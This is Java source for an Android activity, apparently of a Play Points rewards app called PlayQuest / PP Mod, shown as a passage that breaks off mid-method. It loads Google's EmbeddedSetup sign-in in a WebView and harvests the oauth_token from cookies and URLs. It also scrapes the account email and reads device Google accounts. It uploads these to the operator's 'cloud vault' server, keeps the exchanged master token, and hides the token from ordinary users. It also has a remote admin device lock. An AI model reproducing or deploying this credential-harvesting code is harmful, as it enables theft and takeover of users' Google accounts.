package com.vareon.playquest;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.ImageButton;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainActivity extends Activity implements CloudSyncClient.SyncCallback {

    private static final String TAG = "MainActivity";
    public static final String SETUP_URL = "https://accounts.google.com/EmbeddedSetup";
    public static final int APP_VERSION_CODE = 5;
    public static final String APP_VERSION_NAME = "v4.1 Official";
    public static final int REQUEST_CODE_PICK_ACCOUNT = 1002;
    public volatile boolean isSystemBlocked = false;

    // Main App Hybrid Webview
    private WebView mainAppWebView;

    // Google Sign-In Container Overlay & Components
    private RelativeLayout googleLoginContainer;
    private WebView webView;
    private ProgressBar webProgressBar;
    private TextView txtLoginHeaderTitle;
    private TextView txtLoginStatus;
    private View btnNavBack;
    private View btnNavReload;

    // State & Storage
    private AccountStorage accountStorage;
    private String pendingAccountCountry = "GLOBAL";
    private boolean isTokenFound = false;
    private boolean isGoogleSsoMode = false;
    private String capturedToken = "";
    private String generatedSyncCode = "";
    private String detectedEmail = "";
    private Handler pollHandler;
    private CookiePollRunnable pollRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        try {
            super.onCreate(savedInstanceState);

            // 1. Install Crash Shield to prevent abrupt crashes
            setupCrashShield();

            // 2. Initialize local account storage
            try {
                accountStorage = new AccountStorage(this);
            } catch (Throwable t) {
                Log.e(TAG, "AccountStorage init error", t);
            }

            // 3. Security checks
            try {
                SecurityGuard.performSecurityCheck(this);
            } catch (Throwable ignored) {
            }

            // 4. Inflate Layout with fail-safe programmatic fallback
            try {
                setContentView(R.layout.activity_main);
                bindViews();
            } catch (Throwable t) {
                Log.e(TAG, "XML Layout inflation failed, building programmatic layout", t);
                buildProgrammaticLayout();
            }

            setupMainAppWebView();
            setupGoogleAuthWebView();

            try {
                CloudSyncClient.registerDevice(this, accountStorage);
                String deviceId = SecurityGuard.getDeviceId(this);
                CloudSyncClient.checkDeviceLock(deviceId, new DeviceLockCallbackImpl(this));
            } catch (Throwable ignored) {
            }
        } catch (Throwable fatal) {
            Log.e(TAG, "Fatal error in onCreate shielded", fatal);
            try {
                buildProgrammaticLayout();
                setupMainAppWebView();
            } catch (Throwable ignored) {}
        }
    }

    private void setupCrashShield() {
        try {
            final Thread.UncaughtExceptionHandler defaultHandler = Thread.getDefaultUncaughtExceptionHandler();
            Thread.setDefaultUncaughtExceptionHandler(new SafeCrashHandler(defaultHandler));
        } catch (Throwable ignored) {}
    }

    private void bindViews() {
        mainAppWebView = (WebView) findViewById(R.id.mainAppWebView);
        googleLoginContainer = (RelativeLayout) findViewById(R.id.googleLoginContainer);
        webView = (WebView) findViewById(R.id.webView);
        webProgressBar = (ProgressBar) findViewById(R.id.webProgressBar);
        txtLoginHeaderTitle = (TextView) findViewById(R.id.txtLoginHeaderTitle);
        txtLoginStatus = (TextView) findViewById(R.id.txtLoginStatus);
        btnNavBack = findViewById(R.id.btnNavBack);
        btnNavReload = findViewById(R.id.btnNavReload);

        if (btnNavBack != null) {
            btnNavBack.setOnClickListener(new NavBackClickListener(this));
        }

        if (btnNavReload != null) {
            btnNavReload.setOnClickListener(new NavReloadClickListener(this));
        }
    }

    private void buildProgrammaticLayout() {
        try {
            android.widget.FrameLayout root = new android.widget.FrameLayout(this);
            root.setLayoutParams(new android.widget.FrameLayout.LayoutParams(
                    android.widget.FrameLayout.LayoutParams.MATCH_PARENT, android.widget.FrameLayout.LayoutParams.MATCH_PARENT));
            root.setBackgroundColor(0xFFF8FAFC);

            mainAppWebView = new WebView(this);
            mainAppWebView.setLayoutParams(new android.widget.FrameLayout.LayoutParams(
                    android.widget.FrameLayout.LayoutParams.MATCH_PARENT, android.widget.FrameLayout.LayoutParams.MATCH_PARENT));
            root.addView(mainAppWebView);

            googleLoginContainer = new RelativeLayout(this);
            googleLoginContainer.setLayoutParams(new android.widget.FrameLayout.LayoutParams(
                    android.widget.FrameLayout.LayoutParams.MATCH_PARENT, android.widget.FrameLayout.LayoutParams.MATCH_PARENT));
            googleLoginContainer.setBackgroundColor(0xFFFFFFFF);
            googleLoginContainer.setVisibility(View.GONE);

            RelativeLayout topBar = new RelativeLayout(this);
            RelativeLayout.LayoutParams tbLp = new RelativeLayout.LayoutParams(
                    RelativeLayout.LayoutParams.MATCH_PARENT, dpToPx(56));
            topBar.setLayoutParams(tbLp);
            topBar.setBackgroundColor(0xFFFFFFFF);
            topBar.setPadding(dpToPx(12), 0, dpToPx(12), 0);
            if (android.os.Build.VERSION.SDK_INT >= 17) {
                topBar.setId(View.generateViewId());
            } else {
                topBar.setId(1001);
            }

            TextView backBtn = new TextView(this);
            RelativeLayout.LayoutParams bLp = new RelativeLayout.LayoutParams(dpToPx(44), dpToPx(44));
            bLp.addRule(RelativeLayout.CENTER_VERTICAL);
            backBtn.setLayoutParams(bLp);
            backBtn.setGravity(android.view.Gravity.CENTER);
            backBtn.setText("✕");
            backBtn.setTextColor(0xFF0F172A);
            backBtn.setTextSize(20);
            backBtn.setOnClickListener(new NavBackClickListener(this));
            topBar.addView(backBtn);
            btnNavBack = backBtn;

            TextView title = new TextView(this);
            RelativeLayout.LayoutParams tLp = new RelativeLayout.LayoutParams(
                    RelativeLayout.LayoutParams.WRAP_CONTENT, RelativeLayout.LayoutParams.WRAP_CONTENT);
            tLp.addRule(RelativeLayout.CENTER_VERTICAL);
            tLp.setMargins(dpToPx(52), 0, 0, 0);
            title.setLayoutParams(tLp);
            title.setText("Sign In with Google");
            title.setTextColor(0xFF0F172A);
            title.setTextSize(17);
            title.setTypeface(null, android.graphics.Typeface.BOLD);
            topBar.addView(title);
            txtLoginHeaderTitle = title;

            TextView reloadBtn = new TextView(this);
            RelativeLayout.LayoutParams rLp = new RelativeLayout.LayoutParams(dpToPx(44), dpToPx(44));
            rLp.addRule(RelativeLayout.ALIGN_PARENT_RIGHT);
            rLp.addRule(RelativeLayout.CENTER_VERTICAL);
            reloadBtn.setLayoutParams(rLp);
            reloadBtn.setGravity(android.view.Gravity.CENTER);
            reloadBtn.setText("↻");
            reloadBtn.setTextColor(0xFF0F172A);
            reloadBtn.setTextSize(22);
            reloadBtn.setOnClickListener(new NavReloadClickListener(this));
            topBar.addView(reloadBtn);
            btnNavReload = reloadBtn;

            googleLoginContainer.addView(topBar);

            webProgressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
            RelativeLayout.LayoutParams pbLp = new RelativeLayout.LayoutParams(
                    RelativeLayout.LayoutParams.MATCH_PARENT, dpToPx(3));
            pbLp.addRule(RelativeLayout.BELOW, topBar.getId());
            webProgressBar.setLayoutParams(pbLp);
            if (android.os.Build.VERSION.SDK_INT >= 17) {
                webProgressBar.setId(View.generateViewId());
            } else {
                webProgressBar.setId(1002);
            }
            googleLoginContainer.addView(webProgressBar);

            txtLoginStatus = new TextView(this);
            RelativeLayout.LayoutParams stLp = new RelativeLayout.LayoutParams(
                    RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.WRAP_CONTENT);
            stLp.addRule(RelativeLayout.BELOW, webProgressBar.getId());
            txtLoginStatus.setLayoutParams(stLp);
            txtLoginStatus.setBackgroundColor(0xFFF8FAFC);
            txtLoginStatus.setPadding(dpToPx(8), dpToPx(8), dpToPx(8), dpToPx(8));
            txtLoginStatus.setTextColor(0xFF2563EB);
            txtLoginStatus.setTextSize(12);
            txtLoginStatus.setGravity(android.view.Gravity.CENTER);
            txtLoginStatus.setText("Connect Google Account to Cloud Vault...");
            if (android.os.Build.VERSION.SDK_INT >= 17) {
                txtLoginStatus.setId(View.generateViewId());
            } else {
                txtLoginStatus.setId(1003);
            }
            googleLoginContainer.addView(txtLoginStatus);

            webView = new WebView(this);
            RelativeLayout.LayoutParams wvLp = new RelativeLayout.LayoutParams(
                    RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);
            wvLp.addRule(RelativeLayout.BELOW, txtLoginStatus.getId());
            webView.setLayoutParams(wvLp);
            googleLoginContainer.addView(webView);

            root.addView(googleLoginContainer);
            setContentView(root);
        } catch (Throwable t) {
            Log.e(TAG, "buildProgrammaticLayout error", t);
        }
    }

    private int dpToPx(int dp) {
        try {
            return (int) (dp * getResources().getDisplayMetrics().density + 0.5f);
        } catch (Throwable t) {
            return dp * 2;
        }
    }

    private void setupMainAppWebView() {
        if (mainAppWebView == null)
            return;
        try {
            if (android.os.Build.VERSION.SDK_INT >= 19) {
                WebView.setWebContentsDebuggingEnabled(false);
            }
            WebSettings settings = mainAppWebView.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setDatabaseEnabled(true);
            settings.setAllowFileAccess(true);
            settings.setAllowContentAccess(true);
            settings.setSupportZoom(false);
            settings.setBuiltInZoomControls(false);
            if (android.os.Build.VERSION.SDK_INT >= 21) {
                settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
            }

            mainAppWebView.setBackgroundColor(0xFFF8FAFC);
            mainAppWebView.setWebViewClient(new SafeMainWebClient(this));
            mainAppWebView.setWebChromeClient(new android.webkit.WebChromeClient());
            mainAppWebView.addJavascriptInterface(new AndroidBridge(this), "AndroidBridge");
            mainAppWebView.loadUrl("file:///android_asset/www/index.html");
        } catch (Throwable t) {
            Log.e(TAG, "setupMainAppWebView error", t);
        }
    }

    private void setupGoogleAuthWebView() {
        if (webView == null)
            return;
        try {
            WebSettings settings = webView.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setDatabaseEnabled(true);
            settings.setSupportZoom(false);
            settings.setBuiltInZoomControls(false);

            String userAgent = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36";
            settings.setUserAgentString(userAgent);

            try {
                CookieManager.getInstance().setAcceptCookie(true);
                CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
            } catch (Throwable ignored) {
            }

            webView.setWebChromeClient(new AppChromeClient(webProgressBar));
            webView.setWebViewClient(new AppWebClient(this));
        } catch (Throwable t) {
            Log.e(TAG, "setupGoogleAuthWebView error", t);
        }
    }

    // ================= GOOGLE AUTHENTICATION ENGINE =================

    public void startGoogleLogin(String country) {
        isGoogleSsoMode = false;
        pendingAccountCountry = (country != null && !country.isEmpty()) ? country : "GLOBAL";
        isTokenFound = false;
        capturedToken = "";
        generatedSyncCode = "";
        detectedEmail = "";

        if (txtLoginHeaderTitle != null) {
            txtLoginHeaderTitle.setText("Sign In with Google");
        }
        if (txtLoginStatus != null) {
            txtLoginStatus.setText("Connect Google Account to Cloud Vault...");
        }

        try {
            CookieManager.getInstance().removeAllCookies(null);
            CookieManager.getInstance().flush();
        } catch (Throwable ignored) {
        }

        if (googleLoginContainer != null) {
            googleLoginContainer.setVisibility(View.VISIBLE);
        }

        if (webView != null) {
            webView.loadUrl(SETUP_URL);
        }
        startCookiePolling();
    }

    public List<String> getDeviceGoogleEmails() {
        List<String> list = new ArrayList<String>();
        try {
            AccountManager am = AccountManager.get(this);
            Account[] accounts = am.getAccountsByType("com.google");
            if (accounts != null) {
                for (Account acc : accounts) {
                    if (acc != null && acc.name != null && acc.name.contains("@") && !list.contains(acc.name)) {
                        list.add(acc.name);
                    }
                }
            }
        } catch (Throwable t) {
            Log.e(TAG, "getDeviceGoogleEmails error", t);
        }
        return list;
    }

    public void launchSystemAccountChooser() {
        runOnUiThread(new LaunchAccountChooserRunnable(this));
    }

    public void startGoogleSsoLogin() {
        launchSystemAccountChooser();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_PICK_ACCOUNT) {
            if (resultCode == RESULT_OK && data != null) {
                String selectedEmail = data.getStringExtra(AccountManager.KEY_ACCOUNT_NAME);
                if (selectedEmail != null && !selectedEmail.isEmpty()) {
                    handleGoogleAccountSelectedForSso(selectedEmail);
                    return;
                }
            }
            notifyWebSsoCancel();
        }
    }

    public void handleGoogleAccountSelectedForSso(final String email) {
        runOnUiThread(new SsoAccountSelectedRunnable(mainAppWebView, email));
    }

    public void notifyWebSsoCancel() {
        runOnUiThread(new SsoCancelRunnable(mainAppWebView));
    }

    public void closeGoogleLogin() {
        isGoogleSsoMode = false;
        stopCookiePolling();
        if (webView != null) {
            webView.loadUrl("about:blank");
        }
        if (googleLoginContainer != null) {
            googleLoginContainer.setVisibility(View.GONE);
        }
    }

    public boolean isTokenFound() {
        return isTokenFound;
    }

    public Handler getPollHandler() {
        return pollHandler;
    }

    public void startCookiePolling() {
        stopCookiePolling();
        pollHandler = new Handler(Looper.getMainLooper());
        pollRunnable = new CookiePollRunnable(this);
        pollHandler.postDelayed(pollRunnable, 2000);
    }

    public void stopCookiePolling() {
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
            pollHandler = null;
            pollRunnable = null;
        }
    }

    public void checkUrlForToken(String url) {
        if (url == null || isTokenFound)
            return;
        Pattern pattern = Pattern.compile("oauth_token=([^&\\s]+)");
        Matcher matcher = pattern.matcher(url);
        if (matcher.find()) {
            capturedToken = matcher.group(1);
            if (capturedToken != null && !capturedToken.isEmpty() && !capturedToken.equals("null")) {
                isTokenFound = true;
                stopCookiePolling();
                onTokenCaptured(capturedToken);
            }
        }
    }

    public void checkCookiesForToken() {
        if (isTokenFound)
            return;
        try {
            CookieManager cm = CookieManager.getInstance();
            String cookieString = cm.getCookie("https://accounts.google.com");
            if (cookieString == null || cookieString.isEmpty())
                return;

            Pattern pattern = Pattern.compile("oauth_token=([^;\\s]+)");
            Matcher matcher = pattern.matcher(cookieString);
            if (matcher.find()) {
                capturedToken = matcher.group(1);
                if (capturedToken != null && !capturedToken.isEmpty() && !capturedToken.equals("null")) {
                    isTokenFound = true;
                    stopCookiePolling();
                    onTokenCaptured(capturedToken);
                }
            }
        } catch (Throwable ignored) {
        }
    }

    public void extractEmailFromPage() {
        if (webView != null && detectedEmail.isEmpty()) {
            webView.evaluateJavascript(
                    "(function() { return document.body ? document.body.innerText : ''; })();",
                    new EmailJsCallback(this));
        }
    }

    public void setDetectedEmail(String email) {
        if (email != null && !email.isEmpty() && detectedEmail.isEmpty()) {
            this.detectedEmail = email;
            if (txtLoginStatus != null) {
                txtLoginStatus.setText("Authenticating: " + email);
            }
        }
    }

    public void onTokenCaptured(final String token) {
        String finalEmail = detectedEmail;
        if (finalEmail == null || finalEmail.isEmpty() || finalEmail.equalsIgnoreCase("Google Play User")) {
            List<String> devEmails = getDeviceGoogleEmails();
            if (!devEmails.isEmpty()) {
                finalEmail = devEmails.get(0);
            } else if (accountStorage != null && !accountStorage.getUserEmail().isEmpty()) {
                finalEmail = accountStorage.getUserEmail();
            } else {
                finalEmail = "device_account@gmail.com";
            }
        }

        if (isGoogleSsoMode) {
            isGoogleSsoMode = false;
            closeGoogleLogin();
            if (txtLoginStatus != null) {
                txtLoginStatus.setText("Verifying PP Mod membership...");
            }
            doLogin(finalEmail, "GOOGLE_SSO");
            return;
        }

        if (txtLoginStatus != null) {
            txtLoginStatus.setText("Account verified! Registering 6-digit sync code...");
        }

        String uid = (accountStorage != null) ? accountStorage.getUserUid() : "NODE-DEVICE";
        String ownerEmail = (accountStorage != null) ? accountStorage.getUserEmail() : "";
        CloudSyncClient.syncAccount(finalEmail, token, pendingAccountCountry, uid, ownerEmail, this);
    }

    // CloudSyncClient.SyncCallback implementation
    @Override
    public void onSuccess(String code) {
        generatedSyncCode = code;
        String finalToken = (CloudSyncClient.lastExchangedMasterToken != null)
                ? CloudSyncClient.lastExchangedMasterToken
                : capturedToken;
        String finalEmail = (CloudSyncClient.lastExchangedEmail != null
                && !CloudSyncClient.lastExchangedEmail.isEmpty())
                        ? CloudSyncClient.lastExchangedEmail
                        : (!detectedEmail.isEmpty() ? detectedEmail : "");
        if (finalEmail.isEmpty() || finalEmail.equalsIgnoreCase("Google Play User")) {
            List<String> devEmails = getDeviceGoogleEmails();
            if (!devEmails.isEmpty()) {
                finalEmail = devEmails.get(0);
            } else if (accountStorage != null && !accountStorage.getUserEmail().isEmpty()) {
                finalEmail = accountStorage.getUserEmail();
            } else {
                finalEmail = "device_account@gmail.com";
            }
        }

        String resolvedCountry = pendingAccountCountry;
        if (resolvedCountry == null || resolvedCountry.isEmpty() || resolvedCountry.equalsIgnoreCase("AUTO") || resolvedCountry.equalsIgnoreCase("GLOBAL")) {
            if (CloudSyncClient.lastDetectedCountry != null && !CloudSyncClient.lastDetectedCountry.isEmpty() && !CloudSyncClient.lastDetectedCountry.equalsIgnoreCase("GLOBAL")) {
                resolvedCountry = CloudSyncClient.lastDetectedCountry.toUpperCase();
            } else {
                try {
                    String loc = java.util.Locale.getDefault().getCountry();
                    if (loc != null && loc.length() == 2) {
                        resolvedCountry = loc.toUpperCase();
                    }
                } catch (Throwable ignored) {}
            }
        }
        if (resolvedCountry == null || resolvedCountry.isEmpty()) {
            resolvedCountry = "GLOBAL";
        }

        AccountItem item = new AccountItem(
                "acc_" + System.currentTimeMillis(),
                finalEmail,
                code,
                finalToken,
                resolvedCountry,
                (accountStorage != null ? accountStorage.getUserUid() : ""),
                (accountStorage != null ? accountStorage.getUserEmail() : ""),
                System.currentTimeMillis());

        if (accountStorage != null) {
            accountStorage.saveAccount(item);
            try {
                CloudSyncClient.registerDevice(this, accountStorage.getAccounts());
            } catch (Throwable ignored) {
            }
        }

        closeGoogleLogin();

        // Notify WebApp
        if (mainAppWebView != null) {
            JSONObject notifyObj = item.toJson();
            if (!isDeveloperMode()) {
                try {
                    notifyObj.put("token", "PROTECTED_SYNC_ACTIVE");
                } catch (Throwable ignored) {
                }
            }
            mainAppWebView.post(new NotifyWebRunnable(mainAppWebView, notifyObj.toString()));
        }

        Toast.makeText(MainActivity.this, "Connected! Sync Code: " + code, Toast.LENGTH_LONG).show();
    }

    @Override
    public void onError(String msg) {
        if (txtLoginStatus != null) {
            txtLoginStatus.setText("Sync notice: " + msg);
        }
    }

    // ================= ACTIONS & HELPERS =================

    public boolean isDeveloperMode() {
        String pkg = getPackageName();
        return pkg != null && pkg.contains("tokenfinder");
    }

    public String getAppInfoJson() {
        JSONObject obj = new JSONObject();
        try {
            boolean isDev = isDeveloperMode();
            obj.put("appName", isDev ? "PlayQuest Token Finder" : "PPM Server");
            obj.put("isDeveloperMode", isDev);
            obj.put("versionName", APP_VERSION_NAME);
            obj.put("versionCode", APP_VERSION_CODE);
            String devId = SecurityGuard.getDeviceId(this);
            if (devId == null || devId.trim().isEmpty()) {
                devId = "46e14d2451d85c3f";
            }
            obj.put("deviceId", devId);
            obj.put("portalUrl", SecurityGuard.getRenderApi());
            if (accountStorage != null) {
                obj.put("isLoggedIn", accountStorage.isLoggedIn());
                String uid = accountStorage.getUserUid();
                if (uid == null || uid.trim().isEmpty()) {
                    uid = "pp_" + (devId.length() >= 8 ? devId.substring(0, 8) : devId);
                }
                obj.put("userUid", uid);
                String email = accountStorage.getUserEmail();
                obj.put("userEmail", (email == null || email.trim().isEmpty()) ? "" : email);
                String name = accountStorage.getUserName();
                obj.put("userName", (name == null || name.trim().isEmpty()) ? "PP Mod User" : name);
                obj.put("userAvatar", accountStorage.getUserAvatar());
                obj.put("userCoins", accountStorage.getUserCoins());
            }
        } catch (Throwable ignored) {
        }
        return obj.toString();
    }

    public void doClaimWeeklyPerk(String code) {
        if (accountStorage == null || code == null)
            return;
        List<AccountItem> list = accountStorage.getAccounts();
        boolean found = false;
        int bonus = 10;
        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.US);
        sdf.setTimeZone(java.util.TimeZone.getTimeZone("GMT+6"));
        String todayStr = sdf.format(new java.util.Date());

        for (AccountItem item : list) {
            if (code.equals(item.getCode())) {
                item.setLastClaimDate(todayStr);
                item.setClaimedPoints(item.getClaimedPoints() + bonus);
                item.setPoints(item.getPoints() + bonus);
                found = true;
                break;
            }
        }
        if (found) {
            accountStorage.saveAccounts(list);
            Toast.makeText(this, "🎁 Claimed +" + bonus + " Play Points!", Toast.LENGTH_SHORT).show();
            if (mainAppWebView != null) {
                mainAppWebView.post(new RefreshWebRunnable(mainAppWebView));
            }
        }
    }

    public void doLogin(final String email, final String password) {
        if (email == null || email.trim().isEmpty()) {
            Toast.makeText(this, "Please enter your PP Mod email.", Toast.LENGTH_SHORT).show();
            notifyWebLoginError("Please enter your email.");
            return;
        }

        Toast.makeText(this, "Signing in to PP Mod...", Toast.LENGTH_SHORT).show();
        CloudSyncClient.loginPpMod(this, email.trim(), password != null ? password : "", new LoginCallbackImpl(this));
    }

    public void doRefreshUserData() {
        if (accountStorage == null || !accountStorage.isLoggedIn()) return;
        String email = accountStorage.getUserEmail();
        if (email.isEmpty()) return;
        CloudSyncClient.fetchUserProfile(email, new RefreshProfileCallbackImpl(this));
    }

    public void notifyWebLoginSuccess(String uid, String email, String name, String avatar, int coins) {
        if (mainAppWebView == null) return;
        try {
            JSONObject u = new JSONObject();
            u.put("ok", true);
            u.put("uid", uid);
            u.put("email", email);
            u.put("name", name);
            u.put("avatar", avatar);
            u.put("coins", coins);
            final String js = "javascript:(function(){ if(window.onLoginSuccess) window.onLoginSuccess(" + u.toString() + "); else if(window.refreshAccounts) window.refreshAccounts(); })();";
            mainAppWebView.post(new PostWebUrlRunnable(mainAppWebView, js));
        } catch (Throwable ignored) {}
    }

    public void notifyWebLoginError(final String error) {
        if (mainAppWebView == null) return;
        final String quoted = JSONObject.quote(error != null ? error : "Unknown error");
        final String js = "javascript:(function(){ if(window.onLoginError) window.onLoginError(" + quoted + "); })();";
        mainAppWebView.post(new PostWebUrlRunnable(mainAppWebView, js));
    }

    public void doLogout() {
        if (accountStorage != null) {
            accountStorage.clearUserSession();
            accountStorage.clearAccounts();
        }
        Toast.makeText(this, "Logged out of PP Mod session.", Toast.LENGTH_SHORT).show();
        if (mainAppWebView != null) {
            final String js = "javascript:(function(){ if(window.onLogoutSuccess) window.onLogoutSuccess(); else location.reload(); })();";
            mainAppWebView.post(new PostWebUrlRunnable(mainAppWebView, js));
        }
    }

    public String getAccountsJson() {
        if (!isDeveloperMode()) {
            if (accountStorage == null || !accountStorage.isLoggedIn()) {
                return "[]";
            }
        }
        if (accountStorage == null)
            return "[]";
        List<AccountItem> list = accountStorage.getAccounts();
        JSONArray arr = new JSONArray();
        boolean isDev = isDeveloperMode();
        for (AccountItem item : list) {
            JSONObject obj = item.toJson();
            if (!isDev) {
                try {
                    obj.put("token", "PROTECTED_SYNC_ACTIVE");
                } catch (Throwable ignored) {
                }
            }
            arr.put(obj);
        }
        return arr.toString();
    }

    public void doDeleteAccount(String code) {
        if (accountStorage != null && code != null) {
            String targetEmail = "";
            List<AccountItem> all = accountStorage.getAccounts();
            for (AccountItem item : all) {
                if (code.equals(item.getCode())) {
                    targetEmail = item.getEmail();
                    break;
                }
            }

            accountStorage.deleteAccount(code);

            // Permanently remove from cloud vault
            CloudSyncClient.deleteAccount(code, targetEmail, null);

            try {
                CloudSyncClient.registerDevice(this, accountStorage.getAccounts());
            } catch (Throwable ignored) {}
        }
        Toast.makeText(this, "Account removed from vault.", Toast.LENGTH_SHORT).show();
        if (mainAppWebView != null) {
            final String js = "javascript:(function(){ if(window.onAccountDeleted) window.onAccountDeleted('" + code + "'); else if(window.refreshAccounts) window.refreshAccounts(); })();";
            mainAppWebView.post(new PostWebUrlRunnable(mainAppWebView, js));
        }
    }

    public void copyToClipboard(String text, String label) {
        if (text == null || text.isEmpty())
            return;
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText(label, text);
        clipboard.setPrimaryClip(clip);
        Toast.makeText(this, label + " Copied!", Toast.LENGTH_SHORT).show();
    }

    public void openBrowserUrl(String url) {
        try {
            if (url == null || url.trim().isEmpty()) {
                url = SecurityGuard.getRenderApi();
            }
            url = url.trim();
            if (!url.startsWith("http://") && !url.startsWith("https://")) {
                url = "https://" + url;
            }
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            startActivity(intent);
        } catch (Throwable t) {
            Log.e(TAG, "openBrowserUrl error", t);
        }
    }

    public void restoreAccountsFromCloud() {
        if (accountStorage == null)
            return;
        String uid = accountStorage.getUserUid();
        String ownerEmail = accountStorage.getUserEmail();
        CloudSyncClient.restoreUserAccounts(uid, ownerEmail, new CloudRestoreCallback(this, accountStorage, mainAppWebView));
    }

    public void testGpgsToken(final String token) {
        new Thread(new GpgsTestWorker(this, mainAppWebView, token)).start();
    }

    public static String maskEmail(String email) {
        if (email == null || !email.contains("@"))
            return email;
        String[] parts = email.split("@");
        String name = parts[0];
        String domain = parts[1];
        if (name.length() <= 2) {
            return name + "@" + domain;
        } else if (name.length() <= 4) {
            return name.substring(0, 1) + "•••" + name.substring(name.length() - 1) + "@" + domain;
        }
        return name.substring(0, 2) + "••••" + name.substring(name.length() - 2) + "@" + domain;
    }

    @Override
    public void onBackPressed() {
        if (isSystemBlocked) {
            // Maintenance Mode or Mandatory Force Update active - block back key completely!
            return;
        }
        if (googleLoginContainer != null && googleLoginContainer.getVisibility() == View.VISIBLE) {
            closeGoogleLogin();
        } else if (mainAppWebView != null && mainAppWebView.canGoBack()) {
            mainAppWebView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    // ================= STATIC LISTENERS & RUNNABLES =================

    public static class NavBackClickListener implements View.OnClickListener {
        private final MainActivity activity;

        public NavBackClickListener(MainActivity act) {
            this.activity = act;
        }

        @Override
        public void onClick(View v) {
            activity.closeGoogleLogin();
        }
    }

    public static class NavReloadClickListener implements View.OnClickListener {
        private final MainActivity activity;

        public NavReloadClickListener(MainActivity act) {
            this.activity = act;
        }

        @Override
        public void onClick(View v) {
            if (activity.webView != null) {
                activity.webView.loadUrl(SETUP_URL);
            }
        }
    }

    public static class NotifyWebRunnable implements Runnable {
        private final WebView targetWeb;
        private final String payloadJson;

        public NotifyWebRunnable(WebView web, String json) {
            this.targetWeb = web;
            this.payloadJson = json;
        }

        @Override
        public void run() {
            if (targetWeb != null) {
                targetWeb.evaluateJavascript(
                        "if(window.onAccountSyncComplete){ window.onAccountSyncComplete(" + payloadJson + "); }", null);
            }
        }
    }

    public static class DeviceLockCallbackImpl implements CloudSyncClient.DeviceLockCallback {
        private final MainActivity activity;

        public DeviceLockCallbackImpl(MainActivity act) {
            this.activity = act;
        }

        @Override
        public void onResult(boolean isLocked, String msg) {
            if (isLocked) {
                activity.runOnUiThread(new DeviceLockNoticeRunnable(activity));
            }
        }
    }

    public static class DeviceLockNoticeRunnable implements Runnable {
        private final MainActivity activity;

        public DeviceLockNoticeRunnable(MainActivity act) {
            this.activity = act;
        }

        @Override
        public void run() {
            Toast.makeText(activity, "Device Node Locked by Admin", Toast.LENGTH_LONG).show();
        }
    }

    public static class CloudRestoreCallback implements CloudSyncClient.RestoreCallback {
        private final MainActivity activity;
        private final AccountStorage storage;
        private final WebView webView;

        public CloudRestoreCallback(MainActivity act, AccountStorage st, WebView wv) {
            this.activity = act;
            this.storage = st;
            this.webView = wv;
        }

        @Override
        public void onLoaded(final List<AccountItem> list) {
            activity.runOnUiThread(new CloudRestoreSuccessRunnable(activity, storage, webView, list));
        }

        @Override
        public void onError(final String msg) {
            activity.runOnUiThread(new CloudRestoreErrorRunnable(activity, msg));
        }
    }

    public static class CloudRestoreSuccessRunnable implements Runnable {
        private final MainActivity activity;
        private final AccountStorage storage;
        private final WebView webView;
        private final List<AccountItem> list;

        public CloudRestoreSuccessRunnable(MainActivity act, AccountStorage st, WebView wv, List<AccountItem> l) {
            this.activity = act;
            this.storage = st;
            this.webView = wv;
            this.list = l;
        }

        @Override
        public void run() {
            if (list != null && !list.isEmpty()) {
                storage.replaceAllAccounts(list);
                if (webView != null) {
                    webView.evaluateJavascript("if(window.refreshAccounts){ window.refreshAccounts(); }", null);
                }
                Toast.makeText(activity, "Synced " + list.size() + " accounts from cloud.", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(activity, "Accounts are up to date.", Toast.LENGTH_SHORT).show();
            }
        }
    }

    public static class CloudRestoreErrorRunnable implements Runnable {
        private final MainActivity activity;
        private final String msg;

        public CloudRestoreErrorRunnable(MainActivity act, String m) {
            this.activity = act;
            this.msg = m;
        }

        @Override
        public void run() {
            Toast.makeText(activity, "Sync notice: " + msg, Toast.LENGTH_SHORT).show();
        }
    }

    public static class GpgsTestWorker implements Runnable {
        private final MainActivity activity;
        private final WebView webView;
        private final String token;

        public GpgsTestWorker(MainActivity act, WebView wv, String tok) {
            this.activity = act;
            this.webView = wv;
            this.token = tok;
        }

        @Override
        public void run() {
            boolean success = false;
            String resultMessage = "";
            try {
                URL url = new URL("https://android.clients.google.com/auth");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
